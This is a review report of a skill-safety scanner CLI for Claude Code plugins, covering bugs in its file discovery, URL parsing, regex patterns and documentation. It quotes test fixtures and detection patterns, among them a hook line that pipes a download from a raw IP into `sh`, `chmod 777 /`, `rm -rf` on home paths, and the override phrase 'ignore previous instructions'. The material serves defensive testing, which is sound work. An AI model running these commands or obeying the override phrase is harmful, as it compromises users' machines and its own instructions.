# scanskillsafety-skill — improve-this review (2026-10-04)

**Scope:** Full project (no path/topic argument given).
**Project type:** Claude Code skill wrapping a Node CLI (`cli.cjs`) plus a compiled, dependency-free scanner library (`lib/`, built from `findsafeskills/src/lib/safety/**`).
**Artifacts present:** Skill file (`SKILL.md`), README (`README.md`). No agent instruction files (CLAUDE.md/AGENTS.md), no manifest (`package.json`), no tests, no LICENSE.
**Categories evaluated:** Skill Effectiveness, Token Efficiency & Progressive Disclosure, README Quality, Correctness & Edge Cases (CLI + scanner), Test Coverage & Quality, Accuracy & Consistency.

**How findings were verified:** Every behavioral claim below was reproduced by running `lib/scanText.js` or `cli.cjs` against small fixtures (in a scratch directory, not the repo), by rebuilding upstream `tsconfig.safety-skill.json` to a temp dir and diffing against `lib/`, and by running the CLI against this repo itself.

**Where fixes land:** Findings tagged **[upstream]** are in scanner logic. That code is compiled from `~/Projects/findsafeskills/src/lib/safety/`, so the fix belongs there (with its existing TS tests), followed by a rebuild into `lib/`. Changing scanner logic also changes the safety badges on findsafeskills.com, so the site's listings must be rescanned afterward.

## Priority List

```
#1  [Impact: High   | Confidence: High]   Skill Effectiveness — SKILL.md runs `node cli.cjs` by relative path; fails from the user's project dir
#2  [Impact: High   | Confidence: High]   Correctness — Doesn't find the real plugin/MCP layout (.claude-plugin/plugin.json, skills/*/SKILL.md, hooks, .mcp.json)
#3  [Impact: High   | Confidence: High]   Correctness — GitHub subdirectory URLs parsed wrong; only main/master branches tried
#4  [Impact: High   | Confidence: High]   Correctness [upstream] — Whole-doc flattening makes `.*` patterns span the doc: false positives and a dead chmod check
#5  [Impact: High   | Confidence: High]   Correctness — Quoted examples rate RED; the tool rates its own repo RED with no context to judge
#6  [Impact: High   | Confidence: Medium] Skill Effectiveness — No instructions for what Claude should do with a red/yellow/green/error result
#7  [Impact: Medium | Confidence: High]   Correctness — Findings omit which file/line matched; only the first hit per category is reported
#8  [Impact: Medium | Confidence: High]   Correctness — Exit code is 0 for every rating; no machine-readable output
#9  [Impact: Medium | Confidence: High]   Correctness — No fetch timeout, no top-level error handling, misleading error for a file-path target
#10 [Impact: Medium | Confidence: High]   Test Coverage — cli.cjs (URL parsing, fetching, file discovery) has no tests anywhere
#11 [Impact: Medium | Confidence: High]   Accuracy & Consistency — Checks/non-goals copied by hand in 3 places; lib/ already stale vs upstream
#12 [Impact: Medium | Confidence: High]   README Quality — No install steps, prerequisites, or example output
#13 [Impact: Medium | Confidence: High]   README Quality — Site link/name mismatch; public repo has no LICENSE
#14 [Impact: Medium | Confidence: High]   Edge Cases [upstream] — Secret patterns miss current token formats (github_pat_, sk-ant-, sk-, AIza)
#15 [Impact: Medium | Confidence: Medium] Edge Cases [upstream] — `rm -rf ~/.cache/x` flagged as a home-directory wipe
#16 [Impact: Medium | Confidence: Medium] Token Efficiency — SKILL.md is the human doc; README defers to it; intro repeats the description
#17 [Impact: Low    | Confidence: High]   Accuracy — Small doc claims that don't match behavior ("or links to", stale doc path in lib)
```

## Categorized Breakdown

### Skill Effectiveness

**#1 — SKILL.md runs the CLI by relative path** — Impact High, Confidence High
- Evidence: `SKILL.md:22` — "`node cli.cjs <local-path-or-repo-url>`". There's no install location or skill-directory reference anywhere in SKILL.md.
- Why: When the skill triggers, Claude's working directory is the user's project, not the skill folder. Running the documented command from any other directory fails with `Cannot find module …/cli.cjs` (reproduced from `/tmp`). So the core action of the skill fails on first use unless Claude happens to guess the install path.

**#6 — No output contract for Claude** — Impact High, Confidence Medium
- Evidence: SKILL.md stops at "What it does NOT check" (`SKILL.md:52-66`). Nothing says what to do with the result.
- Why: The model must improvise every branch: what to tell the user on RED (recommend not installing? ask?), on YELLOW (show the matched text?), on "Could not find any of…" (say the scan couldn't run, not that it's clean), and how to handle #5 (a RED caused by quoted examples). Missing branches like these lead to inconsistent and sometimes overconfident advice, which is the failure a safety tool most needs to avoid.

### Correctness & Edge Cases

**#2 — Doesn't find the real plugin/MCP layout** — Impact High, Confidence High
- Evidence: `cli.cjs:11` — `["SKILL.md", "README.md", ".claude-plugin/marketplace.json", "plugin.json"]`, root-level only.
- Reproduced: a directory with `.claude-plugin/plugin.json`, `skills/x/SKILL.md` (containing "ignore previous instructions"), and `hooks/hooks.json` (containing `curl http://1.2.3.4/a | sh`) gives "Could not find any of…" with exit 1. The injection and the hook are never scanned.
- Why: The description promises plugins and MCP servers (`SKILL.md:3`). Claude Code plugins keep their manifest at `.claude-plugin/plugin.json`, skills at `skills/*/SKILL.md`, commands and agents at `commands/*.md` and `agents/*.md`, hooks at `hooks/hooks.json`, and MCP config at `.mcp.json`. Hooks and MCP configs run commands on the user's machine, so they're the highest-risk surface, and none of them are read. Multi-skill repos are also only scanned at the root.

**#3 — GitHub URL parsing and branch guessing** — Impact High, Confidence High
- Evidence: `cli.cjs:25` — `repo: segments[segments.length - 1]`; `cli.cjs:42` — `const branches = ["main", "master"]`.
- Reproduced: `https://github.com/anthropics/skills/tree/main/skills/pdf` parses as `{owner: "anthropics", repo: "pdf"}`. That fetches a nonexistent repo and reports "Could not find".
- Why: Linking straight to one skill inside a collection repo is the most common way skills are shared. Repos whose default branch isn't `main`/`master` (e.g. `trunk`, `develop`) also silently fail.

**#4 — Whole-document flattening breaks line-oriented patterns [upstream]** — Impact High, Confidence High
- Evidence: `lib/normalizeForScan.js:51` — `.replace(/\s+/g, " ")` turns the entire document (all files joined) into one line. The patterns then assume line scope: `lib/patterns/destructiveCommands.js:6` — `/(curl|wget)\s+.*\|\s*(sh|bash|zsh)\b/`; `:7` — `/chmod\s+(-r\s+)?777\s+\/\s*$/`; `lib/patterns/exfiltration.js:5` — `/(curl|wget)\s+.*https?:\/\/(\d{1,3}\.){3}\d{1,3}/`.
- Reproduced:
  - A README with `curl -O https://x.com/a.tgz` and, later, a Markdown table row `| bash | ok |` → YELLOW "Pipes a downloaded script directly into a shell". False positive.
  - "Use curl to fetch." … later "runs on http://127.0.0.1:8080" → YELLOW "Fetches a raw IP-literal URL". False positive.
  - `chmod 777 /` followed by any other text → GREEN. It only fires when it's the last thing in the whole document, so the check is effectively dead.
- Why: This affects both the skill and every findsafeskills badge. False positives teach users to ignore YELLOW, and the dead chmod check is a documented check (`SKILL.md:48`) that doesn't actually run.

**#5 — Quoted or discussed patterns rate RED, with no context to judge** — Impact High, Confidence High
- Evidence: `SKILL.md:40-43` quotes "ignore previous instructions" and names `webhook.site` while explaining the checks.
- Reproduced: `node cli.cjs .` on this repo → `Rating: RED` with two critical findings and one warning.
- Why: Any security-themed skill, prompt-engineering guide, or this tool itself gets RED. Keeping these flagged is defensible: an attacker can also wrap a payload in quotes, and an author-controlled allowlist would be trivially abused. But the output gives neither the user nor Claude what they need to judge the hit (file, line, surrounding text; see #7), and SKILL.md gives no guidance (#6). A RED a reader can't assess is less useful than one they can.

**#7 — Findings have no location, and only one hit per category** — Impact Medium, Confidence High
- Evidence: `cli.cjs:116` — `scanText(texts.join("\n"))` merges all files before scanning. Each pattern module returns after its first match (e.g. `lib/patterns/secrets.js:12-13`, `lib/patterns/destructiveCommands.js:12-13`).
- Why: "[critical] secrets: Contains what looks like a hardcoded GitHub personal access token" doesn't say which file or line. The user can't verify it, and Claude can't show the offending text. Stopping at the first hit also hides extra issues once the first is explained away (#5).

**#8 — Exit code ignores the rating; no JSON output** — Impact Medium, Confidence High
- Evidence: `cli.cjs:116-127` prints and falls through. Reproduced `exit=0` on a RED result.
- Why: The tool can't gate a script, CI job, or pre-install hook, and Claude has to scrape prose to learn the rating. A distinct exit code per rating plus a `--json` flag would make it composable.

**#9 — Fragile error handling** — Impact Medium, Confidence High
- Evidence:
  - `cli.cjs:33`: `fetch(url)` has no timeout. An unreachable host took about 10.5 s per request in testing, and the GitHub path makes up to 8 sequential requests.
  - `cli.cjs:130`: `main()` has no `.catch`.
  - `cli.cjs:85-86`: a path to a single file (e.g. `./SKILL.md`) is treated as a directory and reports "Could not find any of SKILL.md…" (reproduced).
  - `cli.cjs:34`: network failures, 404s, and rate limiting all collapse into the same "Could not find" message.
- Why: Slow or misleading failures push the user (or Claude) toward "it didn't find anything, so it's fine".

**#14 — Secret patterns miss current token formats [upstream]** — Impact Medium, Confidence High
- Evidence: `lib/patterns/secrets.js:4-9` covers only `akia…`, `ghp_…`, `xox?-…`, and PEM headers.
- Reproduced: a fine-grained `github_pat_…` token is reported only as "base64-looking blob" (YELLOW, wrong category), and an `sk-ant-api03-…` key → GREEN. OpenAI `sk-…`/`sk-proj-…`, Google `AIza…`, and GitHub `gho_`/`ghs_`/`ghu_` aren't covered.
- Why: A tool aimed at AI-agent skills should know the formats of AI-provider API keys, which are the secrets most likely to show up in this ecosystem.

**#15 — `rm -rf ~/<subdir>` treated as a home-directory wipe [upstream]** — Impact Medium, Confidence Medium
- Evidence: `lib/patterns/destructiveCommands.js:5` — `(\/(?=[^a-z0-9._-])|\/$|~)`. The `~` branch has no lookahead, unlike the `/` branch.
- Reproduced: `rm -rf ~/.cache/myskill` → YELLOW "Runs `rm -rf` against a root or home-directory path".
- Why: Uninstall instructions commonly clean a subdirectory of `~`. The `/` branch already excludes subpaths, and `~` should get the same treatment (`~`, `~/`, and `~/*` should still match). The finding says "home-directory path", so the current behavior isn't strictly wrong, which is why confidence is Medium.

### Test Coverage & Quality

**#10 — The CLI is untested** — Impact Medium, Confidence High
- Evidence: no test files, `package.json`, or CI in this repo. Upstream tests (`findsafeskills/src/lib/safety/**/*.test.ts`) cover only the scanner library. `cli.cjs` exists only here.
- Why: The bugs in #2, #3, #8, and #9 are all in untested CLI code. Node's built-in `node:test` needs no dependencies, so the repo can stay dependency-free.

### Accuracy & Consistency

**#11 — Three hand-maintained copies of "what's checked"; lib/ already drifting** — Impact Medium, Confidence High
- Evidence: the check list and non-goals appear in `SKILL.md:38-66`, in `cli.cjs:13-18` (`DISCLAIMER`), and in `lib/nonGoals.js` (shipped, but nothing in this repo imports it). Upstream also has `src/lib/safety/checks.ts` (`SAFETY_SCANNER_CHECKS`, whose header says it exists so copy "stay[s] in sync"). Rebuilding upstream emits `checks.js`, which isn't in `lib/`, so `lib/` predates the last upstream change.
- Why: This is a safety tool whose central promise is honest disclosure of its limits. Copies that drift will eventually claim a check that doesn't exist or leave out a non-goal. Nothing verifies that `lib/` matches upstream.

**#17 — Small claims that don't match behavior** — Impact Low, Confidence High
- Evidence:
  - `SKILL.md:62-63` (and `lib/nonGoals.js:33`) say "code in the repo beyond what the manifest/README contains or links to", which implies links are followed. They aren't.
  - `lib/scanText.js:7` points to `docs/plans/safety-scan-implementation-plan.md`, which exists only in the findsafeskills repo.
  - `README.md:8` "zero network calls to any third party except the target repo's own host": the raw-URL fallback (`cli.cjs:93`) fetches whatever URL is given. That's fine, but the sentence should say so.
- Why: Each is minor, but together they chip away at a doc set whose credibility is the product.

### README Quality

**#12 — No install steps, prerequisites, or example output** — Impact Medium, Confidence High
- Evidence: `README.md:15-22`. The only usage is `node cli.cjs <…>`. Nowhere does it say how to install this as a Claude Code skill (e.g. clone into `~/.claude/skills/scanskillsafety`), which Node version is needed (global `fetch` requires Node ≥ 18), or what output looks like.
- Why: The README is the landing page for a public repo linked from findsafeskills.com/safety. A visitor can't get from there to a working install.

**#13 — Site name/link mismatch; no LICENSE** — Impact Medium, Confidence High
- Evidence: `README.md:12` links `https://skillfinder-neon.vercel.app` (the old project name). `README.md:34` says "Linked from findsafeskills.com's `/safety` page". No `LICENSE*` file exists.
- Why: Readers see two different identities for the same site. Without a license, a public repo grants no reuse rights, which is odd for a free tool meant to be copied into people's skill folders. The `## Status` section (`README.md:32-34`) is also a maintainer note rather than reader content.

### Token Efficiency & Progressive Disclosure

**#16 — SKILL.md doubles as the human doc** — Impact Medium, Confidence Medium
- Evidence:
  - `README.md:21-22` says "See `SKILL.md` for the full instructions… read that before trusting a 'green' result", so humans are sent to the agent file.
  - `SKILL.md:8-17` repeats the frontmatter description ("static, offline…", "when to use").
  - The three example invocations (`SKILL.md:27-31`) are aimed at a human reader.
- Why: SKILL.md is small (66 lines), so the token cost is modest. The real problem is that its content is tuned for humans while missing what the agent needs (#1, #6). The fix is to move human-facing explanation to the README (via `make-readme`) and do a `plsfix` clarity pass so SKILL.md says what Claude needs to run the tool and report on it. Keep the "what it does NOT check" list in SKILL.md, since Claude must convey it on every run.
